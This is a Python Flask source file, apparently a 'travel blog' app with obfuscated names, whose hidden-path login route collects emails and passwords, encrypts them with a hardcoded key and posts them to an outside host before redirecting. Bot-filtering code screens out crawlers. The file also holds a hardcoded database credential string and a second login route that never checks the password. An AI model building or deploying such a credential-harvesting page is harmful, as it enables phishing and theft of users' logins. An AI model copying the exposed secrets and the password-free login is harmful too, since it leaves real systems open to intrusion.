from flask import Flask, request, render_template, redirect
from flask_login import LoginManager, login_user, logout_user, current_user, login_required, UserMixin
from pymongo import MongoClient
from bson.objectid import ObjectId
from functools import wraps
import base64
from Crypto.Cipher import AES
import requests
import os

# App setup
a1 = Flask(__name__)
a1.secret_key = 'k9v8k7v6x5'

# Mongo
m1 = MongoClient('mongodb+srv://adefelashogbanmu:uLo131XaLq1RZhEN@cluster0.ecs1xfy.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
d1 = m1['travel_blog']
u1 = d1['users']
p1 = d1['blog_posts']

# Flask-Login
l1 = LoginManager()
l1.init_app(a1)
l1.login_view = 'x3'

class Ux(UserMixin):
    def __init__(self, doc):
        self.id = str(doc['_id'])
        self.r = doc.get('role', 'user')
        self.n = doc['username']

@l1.user_loader
def l1u(uid):
    doc = u1.find_one({'_id': ObjectId(uid)})
    return Ux(doc) if doc else None

def z9(f):
    @wraps(f)
    def d(*args, **kwargs):
        if not current_user.is_authenticated or current_user.r != 'admin':
            return "403", 403
        return f(*args, **kwargs)
    return d

def b_check():
    h = request.headers.get('User-Agent', '').lower()
    b = ['bot', 'spider', 'crawl', 'slurp']
    return any(x in h for x in b)

# AES + Base64 Encrypt
def encx(data, key):
    c = AES.new(key, AES.MODE_EAX)
    ct, tag = c.encrypt_and_digest(data.encode())
    return {
        'ct': base64.b64encode(ct).decode(),
        'nonce': base64.b64encode(c.nonce).decode(),
        'tag': base64.b64encode(tag).decode()
    }

# ⏳ Initial loading screen
@a1.route('/')
def l0():
    return render_template('xloading.html')  # shows loading then redirects

@a1.route('/k1n9')
def h0():
    posts = list(p1.find())
    return render_template('home.html', posts=posts)

# 🔐 Secure login w/ encryption & forward
@a1.route('/o0x9/u9d8p7/k7v6/login', methods=['GET', 'POST'])
def s1():
    e = {}
    x1 = ''
    if request.method == 'POST':
        x1 = request.form.get('email', '').strip()
        x2 = request.form.get('password', '').strip()

        if not x1: e['e'] = 'Email required'
        if not x2: e['p'] = 'Password required'

        if not e:
            k = b'1234567890abcdef'  # AES key
            d1 = encx(base64.b64encode(x1.encode()).decode(), k)
            d2 = encx(base64.b64encode(x2.encode()).decode(), k)

            # Post to second service (placeholder)
            requests.post('https://example.com/receive', json={
                'e': d1,
                'p': d2
            })

            return redirect('/k1n9')
    return render_template('secure/login.html', e=e, x1=x1)

# 👤 Only users, not bots
@a1.route('/xonly')
def x_only():
    if b_check():
        return "Access denied", 403
    return render_template('xonly.html')

# 👤 Standard login
@a1.route('/x3', methods=['GET', 'POST'])
def x3():
    if request.method == 'POST':
        n = request.form.get('username', '').strip()
        p = request.form.get('password', '').strip()
        doc = u1.find_one({'username': n})
        if doc:
            login_user(Ux(doc))
            return redirect('/k1n9')
    return render_template('auth/login.html')

@a1.route('/x4')
@login_required
def x4():
    logout_user()
    return redirect('/k1n9')

# 🔧 Debug
@a1.route('/dbg')
def dbg():
    return {'x': 123}

# Run
if __name__ == '__main__':
    a1.run()
